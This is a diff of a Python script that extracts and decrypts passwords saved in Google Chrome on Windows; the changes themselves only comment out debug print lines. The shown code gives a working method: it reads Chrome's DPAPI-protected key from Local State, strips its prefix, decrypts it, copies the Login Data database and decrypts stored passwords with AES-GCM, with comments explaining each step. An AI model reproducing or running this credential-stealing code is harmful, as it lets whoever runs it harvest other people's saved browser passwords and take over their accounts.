@@ -66,12 +66,12 @@ def get_encryption_key():
     # load the base64 encoded key
     b64_key = local_state["os_crypt"]["encrypted_key"]
     key = base64.b64decode(b64_key)
-    print(key)
+    #print("KEY: ", key)
     # the DPAPI sets magic bytes to denote a string as being protected by the DPAPI
     # see for yourself, the "DPAPI" string attatched to the bytes
     # note that these bytes are in fact the encrypted symmetric key used by Chrome
     # to encrypt/decrypt secrets
-    print(key[:10])
+    #print(key[:10])
     key = key[5:]
     # below will only work if the current user is running this script. I.ee, we need the logon credentials
     return decrypt_data_dpapi(key)
@@ -85,10 +85,10 @@ def decrypt_password(encrypted_password, key):
         # the actual ciphertext is the remaining bytes
         ciphertext = encrypted_password[15:]
         # Decrypt the password
-        print(len(key))
+        #print(len(key))
         cipher = AESGCM(key)
         pt = cipher.decrypt(iv, ciphertext, None).decode()
-        print("CT:", pt)
+        #print("CT:", pt)
         #cipher = AES.new(key, AES.MODE_GCM, iv)
         # return cipher.decrypt(ciphertext)[:-16].decode()
         return pt
@@ -107,7 +107,7 @@ def main():
 
     # get the AES key
     key = get_encryption_key()
-    print("Key retrieved: ", key)
+    #print("Key retrieved: ", key)
     # local sqlite Chrome database path
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
@@ -118,7 +118,7 @@ def main():
     # Remember, SQLite is single user.
     shutil.copyfile(db_path, filename)
     # connect to the database
-    print(db_path)
+    #print(db_path)
     db = sqlite3.connect(filename)
     cursor = db.cursor()
     # `logins` table has the data we need
